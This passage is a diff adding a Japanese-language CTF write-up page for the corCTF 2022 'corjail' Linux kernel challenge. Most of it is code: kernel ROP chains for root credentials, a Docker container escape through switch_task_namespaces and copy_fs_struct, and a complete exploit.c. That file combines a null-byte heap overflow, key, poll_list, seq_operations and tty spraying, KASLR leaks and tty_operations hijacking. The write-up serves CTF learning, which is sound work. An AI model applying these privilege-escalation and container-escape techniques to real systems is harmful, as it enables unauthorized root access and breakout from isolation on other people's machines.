+  *rop++ = 0;
+  *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred
+
+  *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
+  *rop ++ = 0;
+  *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
+  *rop++ = KADDR(0xffffffff810eba40); // commit_creds
+
+  *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16
+                                             // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
+  *rop++ = 0;
+  *rop++ = 0;
+  *rop++ = (ulong)NIRUGIRI;
+  *rop++ = user_cs;
+  *rop++ = user_rflags;
+  *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2;
+  *rop++ = user_ss;
+</code></pre>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924160243.png" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>ルート！</p>
+<h3>10. container escape</h3>
+<p>しかし、この問題はこれで終わりではありません。コンテナの中なので、コンテナエスケープする必要があります。個々から先の知識は全くありません、またもやカンニングしましょう。こっから先は写経です。意味のある写経です。カス写経です。
+といっても、RIPとれてればそんなに難しいことではないみたい。docker内では<code>setns()</code> syscallは禁止されてるから、今回はfilesystem namespaceだけ移動させます。以下の感じ:</p>
+<div class="codeblock-title">abst.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">// ROOTをとるには...?
+commit_cred(prepare_kernel_cred(0));
+
+// docker escape(fs)するには...?
+switch_task_namespaces(find_task_vpid(1), init_nsproxy);
+current-&gt;fs = copy_fs_struct(init_fs);
+</code></pre>
+<p>これだけ！やった〜〜〜〜。</p>
+<div class="codeblock-title">rop.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">  *rop++ = KADDR(0xffffffff81906510); // pop rdi
+  *rop++ = 1; // init process in docker container
+  *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
+  *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
+  *rop ++ = 0;
+  *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
+  *rop++ = KADDR(0xffffffff819b21d3); // pop rsi
+  *rop++ = KADDR(0xffffffff8245a720); // &amp;init_nsproxy
+  *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces
+
+  *rop++ = KADDR(0xffffffff81906510); // pop rdi
+  *rop++ = KADDR(0xffffffff82589740); // &amp;init_fs
+  *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct
+  *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx
+
+  *rop++ = KADDR(0xffffffff81906510); // pop rdi
+  *rop++ = getpid();
+  *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
+
+  *rop++ = KADDR(0xffffffff8117668f); // pop rdx
+  *rop++ = 0x6E0;
+  *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx
+  *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
+  *rop++ = 0; // trash
+</code></pre>
+<h3>11. アウトロ</h3>
+<p><figure class="figure-image figure-image-fotolife mceNonEditable" title=""><img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/smallkirby/20220924/20220924163612.gif" alt="" class="hatena-fotolife" loading="lazy" itemprop="image" title=""></img><figcaption class="mceEditable"></figcaption></figure></p>
+<p>うおうおふぃっしゅらいふ。</p>
+<h3>12. Full Exploit</h3>
+<div class="codeblock-title">exploit.c</div><pre style="padding-top: 0; margin-top: 0;"><code class="language-c">#include &quot;./exploit.h&quot;
+#include &lt;bits/pthreadtypes.h&gt;
+#include &lt;keyutils.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;unistd.h&gt;
+
+/*********** commands ******************/
+#define DEV_PATH &quot;/proc_rw/cormon&quot;   // the path the device is placed
+
+/*********** constants ******************/
+#define DESC_KEY_TOBE_OVERWRITTEN_SEQOPS &quot;exploit0&quot;
+#define SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS 0x8
+#define NUM_KEY_SPRAY (0x60)
+#define NUM_2ND_KEY_SPRAY (NUM_KEY_SPRAY * 2)
+#define NUM_3RD_KEY_SPRAY (0x10 + 0x8)
+#define NUM_3RD_KEY_SIZE (0x290)
+
+#define NUM_PREPARE_KM32_SPRAY 2000
+
+#define NUM_POLLFD (30 + 510 + 1) // stack, kmalloc-4k, kmalloc-32
+#define NUM_1ST_POLLLIST_ALLOC (0x10 - 0x1 + 0x1)
+#define NUM_2ND_POLLLIST_ALLOC (0x120 + 0x20 + 0x40 + 0x40 + 0x40 + 0x200)
+#define TIMEOUT_POLLFD 2000 // 2s
+
+#define NUM_TTY_SPRAY (0x100)
+
+#define NUM_SEQOPERATIONS (NUM_1ST_POLLLIST_ALLOC + 0x100)
+#define NUM_FREE_SEQOPERATIONS (0x160)
+
+#define KADDR(addr) ((ulong)addr - 0xffffffff81000000 + kbase)
+
+/*********** globals ******************/
+
+int cormon_fd;
+int just_fd;
+key_serial_t keys[NUM_KEY_SPRAY * 5] = {0};
+int seqops_fd[0x500];
+int tty_fd[NUM_TTY_SPRAY * 2];
+char *cormon_buf[0x1000 + 0x20] = {0};
+pthread_t threads[0x1000];
+int num_threads = 0;
+pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+
+ulong kbase = 0;
+int neverend = 0;
+
+char *krop_stack = NULL;
+#define KROP_USTACK_SIZE 0x10000
+
+/*********** utils ******************/
+
+int num_keys = 0;
+ulong _alloc_key_prefill_ulong_val = 0;
+void _alloc_key_prefill_ulong() {
+  static char *data = NULL;
+  if (data == NULL) data = calloc(0x1000, 1);
+  //for (int ix = 0; ix != 32 / 8; ++ix) ((ulong*)data)[ix] = _alloc_key_prefill_ulong_val;
+  ((ulong*)data)[0] = _alloc_key_prefill_ulong_val;
+  setxattr(&quot;/home/user/.bashrc&quot;, &quot;user.x&quot;, data, 32, XATTR_CREATE);
+}
+void _alloc_key_prefill_null(void) {
+  _alloc_key_prefill_ulong_val = 0;
+  _alloc_key_prefill_ulong();
+}
+void alloc_key(char *payload, int size, void (*prefill)(void)) {
+  static char *desc = NULL;
+  if (desc == NULL) desc = calloc(1, 0x1000);
+
+  sprintf(desc, &quot;key_%d&quot;, num_keys);
+  if (prefill != NULL) prefill();
+  keys[num_keys] = add_key(&quot;user&quot;, desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
+  if (keys[num_keys] &lt; 0) errExit(&quot;alloc_key&quot;);
+  num_keys++;
+}
+void spray_keys(int num, char c) {
+  static char *payload = NULL;
+  if (payload == NULL) payload = calloc(1, 0x1000);
+  char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+  memset(key_payload, c, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+
+  for (int ix = 0; ix != num; ++ix) alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_null);
+}
+void free_key(key_serial_t key) {
+  if (keyctl_revoke(key) != 0) errExit(&quot;keyctl_revoke&quot;);
+  if (keyctl_unlink(key, KEY_SPEC_PROCESS_KEYRING) != 0) errExit(&quot;keyctl_unlink&quot;);
+  --num_keys;
+}
+
+struct alloc_poll_list_t {
+  int fd;
+  int id;
+  int num_size;
+  int timeout_ms;
+};
+void* alloc_poll_list(void *_arg) {
+  struct pollfd fds[NUM_POLLFD];
+  struct alloc_poll_list_t *arg = (struct alloc_poll_list_t *)_arg;
+  assert(arg-&gt;fd &gt;= 2);
+
+  for (int ix = 0; ix != arg-&gt;num_size; ++ix) {
+    fds[ix].fd = arg-&gt;fd;
+    fds[ix].events = POLLERR;
+  }
+  pthread_mutex_lock(&amp;mutex);
+    ++num_threads;
+  pthread_mutex_unlock(&amp;mutex);
+
+  thread_assign_to_core(0);
+  if (poll(fds, arg-&gt;num_size, arg-&gt;timeout_ms) != 0) errExit(&quot;poll&quot;);
+
+  pthread_mutex_lock(&amp;mutex);
+    --num_threads;
+  pthread_mutex_unlock(&amp;mutex);
+
+  if (neverend) {
+    thread_assign_to_core(2);
+    while(neverend);
+  }
+
+  return NULL;
+}
+
+void nullbyte_overflow(void) {
+  assert(cormon_fd &gt;= 2);
+  memset(cormon_buf, 'B', 0x1000 + 0x20);
+  strcpy((char*)cormon_buf + 1, &quot;THIS_IS_CORMON_BUFFER&quot;);
+  *cormon_buf = 0x00;
+
+  if(write(cormon_fd, cormon_buf, 0x1000) != -1) errExit(&quot;nullbyte_overflow&quot;);
+  errno = 0; // `write()` above must fail, so clear errno here
+}
+
+/*********** main ******************/
+
+int main(int argc, char *argv[]) {
+  char *keybuf = malloc(0x5000); // must be &gt;= 0x4330 (low 2byte of single_next())
+  puts(&quot;[.] Starting exploit.&quot;);
+
+  puts(&quot;[+] preparing stack for later kROP...&quot;);
+  save_state();
+  krop_stack = mmap((void*)0x10000000, KROP_USTACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
+  if (krop_stack == MAP_FAILED) errExit(&quot;mmap&quot;);
+
+  assign_to_core(0);
+  if ((cormon_fd = open(DEV_PATH, O_RDWR)) &lt;= 2) errExit(&quot;open cormon&quot;);
+
+  // Pre-spray kmalloc-32
+  puts(&quot;[+] pre-spraying kmalloc-32...&quot;);
+  for (int ix = 0; ix != NUM_PREPARE_KM32_SPRAY; ++ix) {
+    if (open(&quot;/proc/self/stat&quot;, O_RDONLY) &lt;= 2) errExit(&quot;prespray&quot;);
+  }
+
+  // Spray victim `user_key_payload` in kmalloc-32
+  puts(&quot;[+] Spraying keys...&quot;);
+  spray_keys(NUM_KEY_SPRAY, 'A');
+
+  // Spray poll_list in kmalloc-32 and kmalloc-4k
+  just_fd = open(&quot;/etc/hosts&quot;, O_RDONLY);
+  printf(&quot;[+] Spraying poll_list (fd=%d)...\n&quot;, just_fd);
+  if (just_fd &lt;= 2) errExit(&quot;just_fd&quot;);
+
+  assign_to_core(1);
+  num_threads = 0;
+  for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC + 3; ++ix) {
+    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
+    arg-&gt;fd = just_fd; arg-&gt;id = ix;
+    arg-&gt;timeout_ms = ix &lt; NUM_1ST_POLLLIST_ALLOC ? TIMEOUT_POLLFD : 1;;
+    arg-&gt;num_size = NUM_POLLFD;
+    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(&quot;pthread_create&quot;);
+  }
+
+  // Wait some of `poll_list` in kmalloc-4k is freed (these are expected to be reused by cormon_proc_write())
+  assign_to_core(0);
+  usleep(500 * 1000); // wait threads are initialized
+  for(int ix = NUM_1ST_POLLLIST_ALLOC; ix &lt; NUM_1ST_POLLLIST_ALLOC + 3; ++ix) {
+    pthread_join(threads[ix], NULL);
+  }
+
+  // Spray again victim `user_key_payload` in kmalloc-32
+  spray_keys(NUM_KEY_SPRAY, 'A');
+
+  // NULL-byte overflow (hopelly) on `poll_list`, whose `next` pointer get pointing to `user_key_payload` in kmalloc-32.
+  puts(&quot;[+] NULL-byte overflow ing...&quot;);
+  nullbyte_overflow();
+
+  // Wait all `poll_list` are freed
+  for (int ix = 0; ix != NUM_1ST_POLLLIST_ALLOC; ++ix) {
+    open(&quot;/proc/self/stat&quot;, O_RDONLY);
+    pthread_join(threads[ix], NULL);
+  }
+  puts(&quot;[+] Freed all 'poll_list'&quot;);
+
+  // Place `seq_operations` on UAFed `user_key_payload` in kmalloc-32
+  for(int ix = 0; ix != NUM_SEQOPERATIONS; ++ix) {
+    if ((seqops_fd[ix] = open(&quot;/proc/self/stat&quot;, O_RDONLY)) &lt;= 2) errExit(&quot;open seqops&quot;);
+  }
+
+  // Check all keys to leak kbase via `seq_operations`
+  ulong single_show = 0;
+  key_serial_t uafed_key = 0;
+  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
+    int num_read;
+    memset(keybuf, 0, 0x5000);
+    if((num_read = keyctl_read(keys[ix], keybuf, 0x5000)) &lt;= 0) errExit(&quot;keyctl_read&quot;);
+    if (strncmp(keybuf, &quot;AAAA&quot;, 4) != 0) {
+      single_show = *(ulong*)keybuf;
+      uafed_key = keys[ix];
+      if (single_show == 0) {
+        puts(&quot;[-] somehow, empty key found&quot;);
+      } else break;
+    }
+  }
+  if (single_show == 0) {
+    puts(&quot;[-] Failed to leak kbase&quot;);
+    exit(1);
+  }
+  printf(&quot;[!] leaked single_show: 0x%lx\n&quot;, single_show);
+  kbase = single_show - (0xffffffff813275c0 - 0xffffffff81000000);
+  printf(&quot;[!] leaked kbase: 0x%lx\n&quot;, kbase);
+
+  // Free all keys except UAFed key
+  for (int ix = 0; ix != NUM_KEY_SPRAY * 2; ++ix) {
+    if (keys[ix] != uafed_key) free_key(keys[ix]);
+  }
+  sleep(1); // wait GC(security/keys/gc.c) actually frees keys
+
+  // Place `tty_file_private` on UAFed `user_key_payload` in kmalloc-32
+  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
+    if ((tty_fd[ix] = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY)) &lt;= 2) errExit(&quot;open tty&quot;);
+  }
+
+  // Read `tty_file_private.tty` which points to `tty_struct` in kmalloc-1024
+  memset(keybuf, 0, 0x5000);
+  int num_read = 0;
+  if((num_read = keyctl_read(uafed_key, keybuf, 0x5000)) &lt;= 0) errExit(&quot;keyctl_read&quot;);
+  printf(&quot;[+] read 0x%x bytes from UAFed key\n&quot;, num_read);
+  ulong km1024_leaked = 0;
+  ulong *tmp = (ulong*)keybuf + 1;
+  for (int ix = 0; ix != 0x4330/8 - 2 - 1; ++ix) {
+    if (
+      (tmp[ix] &gt;&gt; (64-4*4)) == 0xFFFF &amp;&amp; // tty must be in kheap
+      (tmp[ix + 1] &gt;&gt; (64-4*4)) == 0xFFFF &amp;&amp; // file must be in kheap
+      tmp[ix+2] == tmp[ix+3] &amp;&amp; tmp[ix+2] != 0 &amp;&amp; // list_head's next and prev are same
+      (tmp[ix] &amp; 0xFF) == 0x00 &amp;&amp; // tty must be 0x100 aligned
+      (tmp[ix + 1] &amp; 0xFF) == 0x00 &amp;&amp; // file must be 0x100 aligned
+      (tmp[ix + 2] &amp; 0xF) == 0x08
+    ) {
+      if (km1024_leaked == 0) {
+        km1024_leaked = tmp[ix];
+        printf(&quot;[!] \t+0: 0x%lx (tty)\n&quot;, tmp[ix]);
+        printf(&quot;[!] \t+1: 0x%lx (*file)\n&quot;, tmp[ix + 1]);
+        printf(&quot;[!] \t+2: 0x%lx (list_head.next)\n&quot;, tmp[ix + 2]);
+        printf(&quot;[!] \t+3: 0x%lx (list_head.prev)\n&quot;, tmp[ix + 3]);
+        break;
+      }
+    }
+  }
+  if (km1024_leaked == 0) {
+    print_curious(keybuf, 0x4300, 0);
+    errExit(&quot;Failed to leak kmalloc-1024&quot;);
+  }
+  printf(&quot;[!] leaked kmalloc-1024: 0x%lx\n&quot;, km1024_leaked);
+
+  /********************************************************/
+
+  // Free `seq_operations`, one of which is `user_key_payload`
+  for (int ix = NUM_SEQOPERATIONS - NUM_FREE_SEQOPERATIONS; ix != NUM_SEQOPERATIONS; ++ix) {
+    close(seqops_fd[ix]);
+  }
+  puts(&quot;[+] Freeed seq_operations&quot;);
+
+  sleep(5); // TODO
+  // Spray `poll_list` in kmalloc-32, one of which is placed on `user_key_payload`
+  assign_to_core(2);
+  neverend = 1;
+  puts(&quot;[+] spraying `poll_list` in kmalloc-32...&quot;);
+  num_threads = 0;
+  for (int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
+    struct alloc_poll_list_t *arg = malloc(sizeof(struct alloc_poll_list_t));
+    arg-&gt;fd = just_fd; arg-&gt;id = ix;
+    arg-&gt;timeout_ms = 3000; // must 1000 &lt; timeout_ms, to wait key GC
+    arg-&gt;num_size = 30 + 2;
+    if(pthread_create(&amp;threads[ix], NULL, alloc_poll_list, arg) != 0) errExit(&quot;pthread_create&quot;);
+  }
+  // wait threads are initialized (to prevent double free)
+  assign_to_core(0);
+  while(num_threads != NUM_2ND_POLLLIST_ALLOC);
+  usleep(300 * 1000);
+
+  // Revoke UAFed key, which is on `poll_list` in kmalloc-32
+  puts(&quot;[+] Freeing UAFed key...&quot;);
+  free_key(uafed_key);
+  sleep(1);
+
+  // Spray keys on UAFed `poll_list`
+  puts(&quot;[+] spraying keys in kmalloc-32&quot;);
+  assert(num_keys == 0);
+  {
+    char *key_payload = malloc(SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+    memset(key_payload, 'X', SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS);
+    ((ulong*)key_payload)[0] = 0x9999999999999999; // debug
+     _alloc_key_prefill_ulong_val = km1024_leaked - 0x18; // 0x18 is offset where `user_key_payload` can modify from
+
+    for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
+      alloc_key(key_payload, SIZE_KEY_TOBE_OVERWRITTEN_SEQOPS, _alloc_key_prefill_ulong);
+    }
+  }
+
+  puts(&quot;[+] waiting corrupted `poll_list` is freed...&quot;);
+  neverend = 0;
+  for(int ix = 0; ix != NUM_2ND_POLLLIST_ALLOC; ++ix) {
+    pthread_join(threads[ix], NULL);
+  }
+
+  // Free all keys
+  for (int ix = 0; ix != NUM_2ND_KEY_SPRAY; ++ix) {
+    free_key(keys[ix]);
+  }
+  puts(&quot;[+] waiting all keys are freed by GC...&quot;);
+  sleep(1); // wait GC(security/keys/gc.c) actually frees keys
+
+  // Spray keys in `kmalloc-1024`, one of which must be placed on `tty_struct`
+  puts(&quot;[+] spraying keys in kmalloc-1024&quot;);
+  assert(num_keys == 0);
+  {
+    char *key_payload = malloc(0x1000);
+    ulong *buf = (ulong*)key_payload;
+    buf[0] = 0x5401; // magic, kref (later `leave`ed and become RBP)
+    buf[1] = KADDR(0xffffffff8191515a); // dev (later become ret addr of `leave` gadget, which is `pop rsp`)
+    buf[2] = km1024_leaked + 0x50 + 0x120; // driver (MUST BE VALID) (later `pop rsp`ed)
+    buf[3] = km1024_leaked + 0x50; // ops
+
+    ulong *ops = (ulong*)(key_payload + 0x50);
+    for (int ix = 0; ix != 0x120 / 8; ++ix) { // sizeof tty_operations
+      ops[ix] = KADDR(0xffffffff81577609); // pop rsp
+    }
+
+    ulong *rop = (ulong*)((char*)ops + 0x120);
+    *rop++ = KADDR(0xffffffff81906510); // pop rdi
+    *rop++ = 0;
+    *rop++ = KADDR(0xffffffff810ebc90); // prepare_kernel_cred
+
+    *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
+    *rop ++ = 0;
+    *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
+    *rop++ = KADDR(0xffffffff810eba40); // commit_creds
+
+    *rop++ = KADDR(0xffffffff81906510); // pop rdi
+    *rop++ = 1; // init process in docker container
+    *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
+    *rop++ = KADDR(0xffffffff812c32a9); // pop rcx (to prevent later `rep`)
+    *rop ++ = 0;
+    *rop++ = KADDR(0xffffffff81a05e4b); // mov rdi, rax; rep movsq; (simple `mov rdi, rax` not found)
+    *rop++ = KADDR(0xffffffff819b21d3); // pop rsi
+    *rop++ = KADDR(0xffffffff8245a720); // &amp;init_nsproxy
+    *rop++ = KADDR(0xffffffff810ea4e0); // switch_task_namespaces
+
+    *rop++ = KADDR(0xffffffff81906510); // pop rdi
+    *rop++ = KADDR(0xffffffff82589740); // &amp;init_fs
+    *rop++ = KADDR(0xffffffff812e7350); // copy_fs_struct
+    *rop++ = KADDR(0xffffffff8131dab0); // push rax; pop rbx
+
+    *rop++ = KADDR(0xffffffff81906510); // pop rdi
+    *rop++ = getpid();
+    *rop++ = KADDR(0xffffffff810e4fc0); // find_task_by_vpid
+
+    *rop++ = KADDR(0xffffffff8117668f); // pop rdx
+    *rop++ = 0x6E0;
+    *rop++ = KADDR(0xffffffff81029e7d); // add rax, rdx
+    *rop++ = KADDR(0xffffffff817e1d6d); // mov qword [rax], rbx ; pop rbx ; ret ; (1 found)
+    *rop++ = 0; // trash
+
+
+    *rop++ = KADDR(0xffffffff81c00ef0 + 0x16); // swapgs_restore_regs_and_return_to_usermode + 0x16
+                                               // mov rdi,rsp; mov rsp,QWORD PTR gs:0x6004; push QWORD PTR [rdi+0x30]; ...
+    *rop++ = 0;
+    *rop++ = 0;
+    *rop++ = (ulong)NIRUGIRI;
+    *rop++ = user_cs;
+    *rop++ = user_rflags;
+    *rop++ = (ulong)krop_stack + KROP_USTACK_SIZE / 2;
+    *rop++ = user_ss;
+
+    printf(&quot;[+] size: 0x%lx\n&quot;, (ulong)rop - (ulong)key_payload);
+    assert((ulong)rop - (ulong)key_payload &lt;= NUM_3RD_KEY_SIZE);
+    assert(512 &lt; NUM_3RD_KEY_SIZE + 0x10 &amp;&amp; NUM_3RD_KEY_SIZE + 0x10 &lt; 1024);
+    for (int ix = 0; ix != NUM_3RD_KEY_SPRAY; ++ix) alloc_key(key_payload, NUM_3RD_KEY_SIZE + 0x10, NULL);
+  }
+
+  // Invoke tty_struct.ops.ioctl
+  puts(&quot;[+] ioctl-ing to /dev/ptmx&quot;);
+  for (int ix = 0; ix != NUM_TTY_SPRAY; ++ix) {
+    ioctl(tty_fd[ix], 0x1234567890, 0xABCDE0000);
+  }
+
+  // end of life (unreachable)
+  puts(&quot;[ ] END of life...&quot;);
+  //sleep(999999);
+}
+</code></pre>
+<h3>13. 参考</h3>
+<ul>
+<li><a href="https://syst3mfailure.io/corjailhttps://syst3mfailure.io/corjail">Author’s writeup</a></li>
+<li><a href="https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail/task/build">corCTF2022 archive</a></li>
+</ul>
+
+
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/highlight.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+      <script>hljs.highlightAll(); hljs.initLineNumbersOnLoad({singleLine:true});</script>
+      <!-- You have to add `<link href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.6.0/styles/default.min.css">` -->
+    
